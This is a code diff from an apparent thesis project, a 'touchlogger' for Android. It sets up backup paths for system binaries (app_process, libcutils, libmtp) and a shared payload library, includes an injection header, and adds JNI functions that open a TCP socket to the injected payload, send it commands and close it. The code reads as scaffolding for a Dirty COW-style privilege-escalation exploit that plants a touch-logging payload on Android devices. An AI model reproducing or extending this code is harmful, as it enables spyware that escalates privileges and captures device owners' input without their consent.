@@ -10,6 +10,7 @@
 #include "dirty/lib_utils/inject.h"
 #include "utils/su_utils.h"
 #include "utils/exec_utils.h"
+#include "utils/net_utils.h"
 
 #ifdef __aarch64__
 #define APP_PROCESS_PATH "/system/bin/app_process64"
@@ -38,7 +39,7 @@ char libcutils_backup_path[PATH_MAX];
 char libmtp_backup_path[PATH_MAX];
 char shared_payload_path[PATH_MAX];
 
-static bool prepareCommon(const char* localPath)
+static void initPaths(const char* localPath)
 {
   snprintf(app_process_backup_path, PATH_MAX, "%s/%s", localPath, "app_process.bak");
   snprintf(exec_payload_path, PATH_MAX, "%s/%s", localPath, EXEC_PAYLOAD_NAME);
@@ -46,6 +47,11 @@ static bool prepareCommon(const char* localPath)
   snprintf(libcutils_backup_path, PATH_MAX, "%s/%s", localPath, "libcutils.so.bak");
   snprintf(libmtp_backup_path, PATH_MAX, "%s/%s", localPath, "libmtp.so.bak");
   snprintf(shared_payload_path, PATH_MAX, "%s/%s", localPath, "libshared_payload.so");
+}
+
+static bool prepareCommon(const char* localPath)
+{
+  initPaths(localPath);
 
   struct stat st;
   if (stat(APP_PROCESS_PATH, &st) == 0)
@@ -562,4 +568,38 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_stringFromJNI(JNIEnv* env
 {
   std::string hello = "Hello from C++";
   return env->NewStringUTF(hello.c_str());
+}
+
+extern "C"
+JNIEXPORT jint JNICALL
+Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_initPayloadConnection(JNIEnv *env,
+                                                                             jclass type,
+                                                                             jint port)
+{
+  return (jint) init_connection((int) port);
+}
+
+extern "C"
+JNIEXPORT jboolean JNICALL
+Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_writeCommandToTcp(JNIEnv *env, jclass type,
+                                                                         jint sockFd,
+                                                                         jstring command_)
+{
+  const char *command = env->GetStringUTFChars(command_, 0);
+  ssize_t written = write_command((int) sockFd, command);
+  env->ReleaseStringUTFChars(command_, command);
+
+  if (written == -1)
+  {
+    LOGV("Unable to write data to socket: %s!", strerror(errno));
+    return (jboolean) false;
+  }
+
+  return (jboolean) true;
+}extern "C"
+JNIEXPORT jboolean JNICALL
+Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_closeTcpSocket(JNIEnv *env, jclass type,
+                                                                      jint sockFd)
+{
+  return (jboolean) (close_connection((int)sockFd) == 0);
 }
